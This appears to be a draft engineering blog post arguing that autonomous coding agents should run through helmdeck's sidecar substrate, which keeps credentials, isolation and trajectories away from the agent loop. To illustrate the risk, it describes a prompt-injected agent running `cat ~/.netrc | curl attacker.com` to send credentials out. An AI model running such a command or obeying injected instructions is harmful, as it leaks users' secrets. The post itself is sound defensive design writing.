---
slug: bash-loops-meet-sidecar-isolation
title: "Autonomous code-fix is a loop. Helmdeck is a substrate. Stop fusing them."
authors: [tosin]
tags: [agent-architecture, security]
description: Most autonomous coding setups today run an agent loop and call out to a shell. The shell is the host's shell, or a Docker container the agent itself manages. The agent ends up owning isolation, credentials, and observability — three jobs that have nothing to do with the loop. Here's what changes when you separate the loop from the substrate.
image: /img/social-card.png
date: 2026-05-22
draft: true
---

## Hook

Most autonomous coding setups today look like this: an agent (Aider, mini-swe-agent, the SWE-bench harness, whatever) runs a step loop, and at each step shells out to *something* — the host's bash, a Docker container the agent spawned, or a CI runner. The agent ends up owning isolation, credentials, and observability. Those three jobs have nothing to do with the loop. The interesting question for helmdeck's v0.14.0 isn't "which agent do we wrap?" — it's "what falls out when we stop wrapping at all and treat the agent and the substrate as orthogonal?"

## Context

[mini-swe-agent](https://github.com/SWE-agent/mini-swe-agent) — the lightweight SWE-bench harness from Princeton/Stanford — is built around an `Environment` interface. Concretely:

```python
class Environment:
    def execute(self, command: str) -> tuple[int, str, str]:
        """Run a shell command, return (exit_code, stdout, stderr)."""
```

That's the entire substrate contract. The harness ships `LocalEnvironment` (run on the host) and `DockerEnvironment` (run in a container the agent spawns). Both work, but both put isolation policy in the agent's hands.

Helmdeck's substrate side is the inverse. Every pack call already runs in a session sidecar — Docker by default, gVisor or Firecracker per operator policy. The control plane brokers vault credentials via placeholder substitution (`${vault:github-token}`) — the sidecar never sees the raw secret. Pack invocations land in `provider_calls` with traceable spans (OTel + Langfuse). All of that is provided to *whatever* runs inside the sidecar; it has nothing to say about the agent loop.

So the integration thesis for [issue #233](https://github.com/tosin2013/helmdeck/issues/233): write a `HelmdeckEnvironment` that satisfies mini-swe-agent's two-method contract by routing every `execute()` through helmdeck's existing `cmd.run` REST API. The agent loop runs anywhere — your laptop, a CI worker, a Vercel function — and helmdeck handles the substrate.

## Finding

Three properties fall out of the separation that neither side has alone.

### 1. The agent never sees the git token

When mini-swe-agent's `LocalEnvironment` does `git push`, the agent process holds the credential — usually because the host has `~/.netrc` or `GITHUB_TOKEN` set in its env. Every step of the loop has read access to that secret; a misbehaving model that gets prompt-injected into `cat ~/.netrc | curl attacker.com` succeeds.

When the same step runs through `HelmdeckEnvironment`, the `git push` command goes over the wire to helmdeck's `cmd.run`. The placeholder `${vault:github-token}` is substituted *inside the sidecar's process tree at exec time*. The agent's stdout/stderr from `cmd.run` carries the result, not the secret. The model that prompts the loop into `cat ~/.netrc` finds an empty file: the credential lives in a vault the agent has no path to.

This isn't theoretical. The cosign-verify work in [PR #222](https://github.com/tosin2013/helmdeck/pull/222) and the deep-dive post on stage-A trust verification ([trust-stage-a-hash-of-hash](/blog/trust-stage-a-hash-of-hash)) sit on the same vault primitive. We didn't build it for `swe.solve`; we built it because every pack in helmdeck has needed it, and `swe.solve` gets to inherit.

### 2. Isolation tier is an operator policy, not an agent decision

`DockerEnvironment` makes the agent the isolation owner. The agent decides which image to pull, which volumes to mount, which capabilities to grant. That's a lot of policy concentrated in one piece of code, and the policy ships with the agent — operators who want stronger isolation (gVisor, Firecracker) need to fork or patch.

Helmdeck inverts it. The session sidecar runtime is configured at deploy time:

```yaml
# helmdeck operator config
sessions:
  runtime: firecracker      # or docker / gvisor
  memory_mb: 4096
  egress_allowlist:
    - github.com
    - api.fireworks.ai
```

The agent loop doesn't know or care. `HelmdeckEnvironment.execute("git clone …")` works the same whether the substrate is Docker on a laptop or Firecracker on a hardened operator box. Upgrading isolation is an operator decision that happens once, applies to every pack call, and the agent code is bit-identical across the change.

### 3. Trajectories are evidence, not afterthoughts

mini-swe-agent emits a `.traj.json` file per run — the full conversation history with the model, every `execute()` call, every exit code. It's the kind of artifact that lives on someone's laptop and gets emailed around when something goes wrong.

Helmdeck has an S3-compatible artifact surface (Garage), used today for blog-publish drafts and slide renders. `swe.solve` writes its trajectory there on every run, with a presigned URL returned in the pack response. The trajectory becomes a first-class artifact — addressable, replayable, retained per the operator's policy. The Artifact Explorer UI can render the trajectory as a sequence; OTel spans can link to the exact bash command at each step.

| Property | mini-swe-agent alone | helmdeck alone | the combination |
|---|---|---|---|
| Git credential surface | Agent process | Per-pack vault | Vault, agent never sees it |
| Isolation owner | Agent code (Docker only) | Operator (Docker/gVisor/Firecracker) | Operator, agent neutral |
| Trajectory | Local file | n/a (no agent loop) | S3-backed artifact, replayable |

## Why this matters to you

The principle generalizes well past mini-swe-agent. If you're building any autonomous-coding setup — your own harness, an Aider wrapper, a custom LangGraph supervisor — the gravitational pull is to let the agent own isolation, credentials, and observability *because the agent is what you're building*. Resist it. Those three jobs are exactly the things you'll regret giving the agent the moment a model misbehaves, an operator wants stronger isolation, or an incident requires a forensic replay.

The cleaner shape is two abstractions: a loop that knows how to reason about code, and a substrate that knows how to isolate and credential and trace. The interface between them is small (mini-swe-agent's `execute()` is one method) and the cost of separating is paid once. The benefit accrues every time you swap the agent (new harness drops; substrate is untouched), upgrade isolation (operator decision; agent untouched), or audit a failure (trajectory is already an artifact).

[Issue #233](https://github.com/tosin2013/helmdeck/issues/233) tracks the v0.14.0 work: Phase 1 builds `HelmdeckEnvironment` as a thin Python adapter, Phase 3 wires it into a `swe.solve` Go pack. The five later phases — trajectory replay UI, OTel spans per agent step, webhook auto-trigger, A2A skill exposure, procedural-memory pack promotion — each open their own issue after Phase 3 lands. Most of them lean on ADRs that are currently [`Status: Proposed`](https://github.com/tosin2013/helmdeck/tree/main/docs/adrs), so committing them in v0.14.0 would be premature; this is the discipline call that keeps the release shippable.

## See also

- [Issue #233 — `swe.solve` epic](https://github.com/tosin2013/helmdeck/issues/233) — the v0.14.0 scope
- [Issue #232 — `repo.fetch` clone_path session-visibility bug](https://github.com/tosin2013/helmdeck/issues/232) — the gating bug for Phase 3
- [mini-swe-agent](https://github.com/SWE-agent/mini-swe-agent) — the upstream harness
- [Aider](https://github.com/paul-gauthier/aider) — the more mature alternative, candidate for a future `HelmdeckEnvironment` backend
- [ADR 033 — GitHub webhook listener](https://github.com/tosin2013/helmdeck/blob/main/docs/adrs/033-github-webhook-listener.md) (Accepted, not built — Phase 6 enabler)
- [ADR 026 — A2A Agent Card](https://github.com/tosin2013/helmdeck/blob/main/docs/adrs/026-a2a-agent-card-endpoint.md) (Proposed — Phase 7 enabler)
- [ADR 029 — Four-tier agent memory API](https://github.com/tosin2013/helmdeck/blob/main/docs/adrs/029-four-tier-agent-memory-api.md) (Proposed — Phase 8 enabler)
